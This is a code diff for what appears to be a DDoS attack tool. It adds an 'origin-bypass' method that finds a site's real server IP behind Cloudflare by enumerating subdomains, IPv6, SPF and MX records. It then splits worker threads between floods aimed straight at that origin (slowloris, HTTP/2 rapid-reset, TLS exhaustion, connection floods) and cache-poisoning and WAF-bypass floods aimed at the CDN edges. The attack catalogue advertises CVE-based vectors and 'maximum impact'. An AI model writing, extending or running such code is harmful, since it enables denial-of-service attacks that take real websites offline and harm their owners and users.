@@ -18,6 +18,7 @@ import { Worker } from "worker_threads";
 import os   from "node:os";
 import path from "node:path";
 import { fileURLToPath } from "node:url";
+import dnsP from "node:dns/promises";
 import {
   CreateAttackBody,
   GetAttackParams,
@@ -432,7 +433,79 @@ const HTTP_PROXY_METHODS = new Set([
   "rapid-reset", "ws-compression-bomb", "h2-goaway-loop", "sse-exhaust",
   // Final form — all vectors + proxy rotation
   "geass-ultima",
+  // CDN bypass — needs proxy rotation for both origin and CDN attacks
+  "origin-bypass",
 ]);
+
+// ── Cloudflare IP range check (for origin-bypass auto-discovery) ──────────
+const _CF_RANGES_OB = [
+  "173.245.48.0/20","103.21.244.0/22","103.22.200.0/22","103.31.4.0/22",
+  "141.101.64.0/18","108.162.192.0/18","190.93.240.0/20","188.114.96.0/20",
+  "197.234.240.0/22","198.41.128.0/17","162.158.0.0/15","104.16.0.0/13",
+  "104.24.0.0/14","172.64.0.0/13","131.0.72.0/22",
+].map(cidr => {
+  const [ip, mask] = cidr.split("/");
+  const p = ip.split(".").map(Number);
+  const n = ((p[0] << 24) | (p[1] << 16) | (p[2] << 8) | p[3]) >>> 0;
+  const m = mask === "0" ? 0 : (~((1 << (32 - Number(mask))) - 1)) >>> 0;
+  return [n, m, (n & m) >>> 0] as [number, number, number];
+});
+
+function _isCFIP(ip: string): boolean {
+  const p = ip.split(".").map(Number);
+  if (p.length !== 4 || p.some(x => isNaN(x))) return false;
+  const n = ((p[0] << 24) | (p[1] << 16) | (p[2] << 8) | p[3]) >>> 0;
+  return _CF_RANGES_OB.some(([, m, net]) => (n & m) === net);
+}
+
+// Finds the real origin IP behind a CDN using DNS enumeration + SPF + IPv6
+async function _findOriginIPForAttack(hostname: string, cdnIPs: string[]): Promise<string | null> {
+  const BYPASS_SUBS = [
+    "direct", "mail", "smtp", "origin", "backend", "server", "api",
+    "staging", "www2", "cpanel", "ftp", "webmail", "admin", "dev",
+    "old", "ns1", "ns2", "pop", "imap", "relay", "host", "vpn",
+  ];
+
+  // 1. Subdomains
+  const subResults = await Promise.allSettled(
+    BYPASS_SUBS.map(async sub => ({
+      ips: await dnsP.resolve4(`${sub}.${hostname}`).catch(() => [] as string[]),
+    }))
+  );
+  for (const r of subResults) {
+    if (r.status !== "fulfilled") continue;
+    for (const ip of r.value.ips) {
+      if (!_isCFIP(ip) && !cdnIPs.includes(ip)) return ip;
+    }
+  }
+
+  // 2. IPv6 AAAA (often unproxied on CF free plan)
+  const ipv6 = await dnsP.resolve6(hostname).catch(() => [] as string[]);
+  if (ipv6.length > 0) return ipv6[0];
+
+  // 3. SPF/TXT record
+  const txts = await dnsP.resolveTxt(hostname).catch(() => [] as string[][]);
+  for (const parts of txts) {
+    const m = parts.join(" ").match(/ip4:([\d./]+)/g);
+    if (m) {
+      for (const e of m) {
+        const candidate = e.slice(4).split("/")[0];
+        if (candidate && !_isCFIP(candidate) && !cdnIPs.includes(candidate)) return candidate;
+      }
+    }
+  }
+
+  // 4. MX records
+  const mx = await dnsP.resolveMx(hostname).catch(() => [] as { exchange: string }[]);
+  for (const { exchange } of mx) {
+    const ips = await dnsP.resolve4(exchange).catch(() => [] as string[]);
+    for (const ip of ips) {
+      if (!_isCFIP(ip) && !cdnIPs.includes(ip)) return ip;
+    }
+  }
+
+  return null;
+}
 
 function spawnPool(
   method: string, target: string, port: number, threads: number,
@@ -874,6 +947,67 @@ async function runAttackWorkers(
   }
 
   // ─────────────────────────────────────────────────────────────────────────
+  //  ORIGIN BYPASS — Dual-Front CDN Bypass
+  //  Front 1 (70%): Auto-discover origin IP → attack directly (bypasses CDN)
+  //    http-pipeline + conn-flood + h2-rst-burst + slowloris + ssl-death on origin IP
+  //  Front 2 (30%): CDN edge exhaustion
+  //    cache-poison + waf-bypass forces 100% origin miss rate on all CDN edges
+  //  Auto-discovery: subdomain enum + IPv6 AAAA + SPF + MX records
+  //  Fallback: bypass-storm + waf-bypass if origin IP not found
+  // ─────────────────────────────────────────────────────────────────────────
+  if (method === "origin-bypass") {
+    const hostname = target
+      .replace(/^https?:\/\//i, "").split("/")[0].split(":")[0];
+
+    // Resolve CDN IPs (to filter them out when looking for origin)
+    const cdnIPs = await dnsP.resolve4(hostname).catch(() => [] as string[]);
+
+    // Auto-discover origin IP
+    const originIP = await _findOriginIPForAttack(hostname, cdnIPs).catch(() => null);
+
+    if (originIP) {
+      console.log(`[origin-bypass] ✓ Origin IP: ${originIP} — dual-front attack started`);
+      // 70% threads → direct origin attack (bypasses CDN entirely)
+      const originT   = Math.ceil(threads * 0.70);
+      const pipeT_ob  = Math.ceil(originT * 0.30);
+      const connT_ob  = Math.ceil(originT * 0.20);
+      const h2rstT_ob = Math.ceil(originT * 0.20);
+      const slowT_ob  = Math.ceil(originT * 0.15);
+      const sslT_ob   = Math.max(50, originT - pipeT_ob - connT_ob - h2rstT_ob - slowT_ob);
+
+      // 30% threads → CDN edge exhaustion (forces 100% origin cache misses)
+      const cdnT      = Math.max(100, threads - originT);
+      const cacheT_ob = Math.ceil(cdnT * 0.55);
+      const wafT_ob   = Math.max(80, cdnT - cacheT_ob);
+
+      await Promise.all([
+        // ── Front 1: direct origin IP attack ─────────────────────────────
+        spawnPool("http-pipeline",  originIP, 80,  pipeT_ob,  Math.max(4, CPU_COUNT),                   signal, onStats),
+        spawnPool("conn-flood",     originIP, 443, connT_ob,  1,                                         signal, onStats),
+        spawnPool("h2-rst-burst",   originIP, 443, h2rstT_ob, Math.max(4, CPU_COUNT),                   signal, onStats),
+        spawnPool("slowloris",      originIP, 80,  slowT_ob,  1,                                         signal, onStats),
+        spawnPool("ssl-death",      originIP, 443, sslT_ob,   2,                                         signal, onStats),
+        // ── Front 2: CDN edge cache exhaustion ───────────────────────────
+        spawnPool("cache-poison",   target,   port, cacheT_ob, 2,                                         signal, onStats),
+        spawnPool("waf-bypass",     target,   port, wafT_ob,   Math.max(4, Math.floor(CPU_COUNT / 2) + 2), signal, onStats),
+      ]);
+      return;
+    } else {
+      console.log(`[origin-bypass] ✗ No origin IP found — fallback bypass-storm`);
+      // Fallback: run bypass-storm (multi-vector WAF bypass) + aggressive cache poisoning
+      const wafFallT  = Math.max(400, Math.ceil(threads * 0.65));
+      const cacheFallT = Math.max(100, threads - wafFallT);
+      await Promise.all([
+        spawnPool("waf-bypass",   target, port, wafFallT,   Math.max(4, Math.floor(CPU_COUNT / 2) + 2), signal, onStats),
+        spawnPool("h2-rst-burst", target, port, wafFallT,   Math.max(4, CPU_COUNT),                     signal, onStats),
+        spawnPool("cache-poison", target, port, cacheFallT, 2,                                           signal, onStats),
+        spawnPool("app-smart-flood", target, port, Math.ceil(threads * 0.40), Math.max(4, Math.floor(CPU_COUNT / 2) + 2), signal, onStats),
+      ]);
+      return;
+    }
+  }
+
+  // ─────────────────────────────────────────────────────────────────────────
   //  GEASS ULTIMA — Final Form: 9 simultaneous vectors across every OSI layer
   //  Each worker independently runs all 9 vectors → CPU_COUNT × 9 vectors total
   // ─────────────────────────────────────────────────────────────────────────
@@ -923,6 +1057,7 @@ const METHODS_CATALOGUE = [
   { id: "geass-override",       name: "Geass Override ∞ [ARES 42v]",          layer: "ALL",  protocol: "TCP/UDP/H2/H3/TLS",    tier: "ARES",   description: "MAX POWER — 42 simultaneous attack vectors: H3-RapidReset(CVE-44487)+QUIC+H2-RST+H2-CONTINUATION(CVE-27316)+H2-Settings+Pipeline+Slowloris+HPACK+WAF+TLS+WS-Deflate+DNS+gRPC+..." },
   { id: "geass-ultima",         name: "Geass Ultima ∞ [FINAL FORM — 9v]",      layer: "ALL",  protocol: "TCP/UDP/H2/TLS",       tier: "ARES",   description: "FORMA FINAL — 9 vetores simultâneos em todas as camadas OSI: RapidReset(CVE-44487)+WAFBypass+H2Storm(6v)+AppFlood+TLSExhaust+ConnFlood+Pipeline+SSE+UDP. Zero delay, máximo impacto" },
   { id: "bypass-storm",         name: "Bypass Storm ∞ (3-Phase Composite)",    layer: "L7",   protocol: "HTTP/2+TLS",           tier: "S",      description: "Phase 1: TLS Exhaust+ConnFlood → Phase 2: WAF Bypass+H2 RST+RapidReset → Phase 3: AppFlood+CacheBust. Fases independentes + RapidReset no Phase 2" },
+  { id: "origin-bypass",        name: "CDN Origin Bypass [Dual-Front]",         layer: "ALL",  protocol: "HTTP+TLS+TCP",         tier: "S",      description: "Auto-descobre IP de origem via subdomain enum+IPv6+SPF+MX. Front 1 (70%): ataca origem diretamente (bypassa CDN). Front 2 (30%): cache-poison+waf-bypass esgota CDN edges. Cloudflare torna-se irrelevante." },
   // L7 Application
   { id: "waf-bypass",           name: "Geass WAF Bypass",                     layer: "L7",   protocol: "HTTP/2",               tier: "S",      description: "JA3+AKAMAI Chrome fingerprint — evades Cloudflare/Akamai WAF with 7 concurrent vectors" },
   { id: "http2-flood",          name: "HTTP/2 Rapid Reset",                   layer: "L7",   protocol: "HTTP/2",               tier: "S",      description: "CVE-2023-44487 — 512-stream RST burst per session, millions req/s" },
